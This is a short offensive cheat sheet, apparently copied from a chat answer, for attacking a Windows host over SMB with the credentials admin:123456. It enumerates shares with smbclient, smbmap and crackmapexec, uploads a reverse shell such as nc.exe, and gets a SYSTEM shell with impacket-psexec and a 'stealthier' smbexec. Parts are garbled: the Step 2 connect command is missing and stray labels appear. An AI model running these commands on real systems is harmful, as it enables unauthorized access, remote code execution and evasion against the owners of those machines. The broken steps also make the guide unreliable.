### 🔹 Step 1: List Available Shares

bash

CopiarEditar

`smbclient -L \\\\10.10.1.10 -U admin%123456`

 Look for shares like:
 
 - `C$` (admin)
- `Users`
- `Shared`
- `IPC$` (not useful)
- Anything custom

---

### 🔹 Step 2: Connect to a Share

Once you find a share:

```
   # Take screenshots of EVERY step
```

You’ll get a prompt like `smb: \>`.

### 🔸 Useful Commands in smbclient:

```
ls               # list files cd foldername    # change directory get file.txt     # download file put shell.exe    # upload a file
```

---

### 🔹 Step 3: Recursively Enumerate with smbmap

```
smbmap -H 10.10.1.10 -u admin -p 123456
```

This gives a full tree view of file permissions and accessible directories.

---

### 🔹 Step 4: Use crackmapexec to Check Privileges

```
crackmapexec smb 10.10.1.10 -u admin -p 123456
```

Look for:

- nginx

```
SMB         10.10.1.10      445    DESKTOP-X    [+] admin:123456 (Pwn3d!)
```

If you see `(Pwn3d!)` — you likely have full admin access.

---

## 🧨 Bonus: Upload and Execute Reverse Shell

If you can **write to a share** and have **command execution access** (e.g., via scheduled task, service abuse, or RPC), upload a reverse shell (e.g., `nc.exe`, `evil.exe`), and:

1. Upload shell:

```
smbclient \\\\10.10.1.10\\SHARENAME -U admin%123456 put nc.exe
```

2. Trigger execution (via RCE method — needs context).

---

## 🚀 Next Steps (If Admin on SMB)

If CrackMapExec says `Pwn3d!`, try:

### 🛠️ `impacket-psexec`:


```
impacket-psexec admin:123456@10.10.1.10
```

Gives direct SYSTEM shell over SMB.

Or:

### ⚙️ `impacket-smbexec` (slightly stealthier):

```
impacket-smbexec admin:123456@10.10.1.10
```
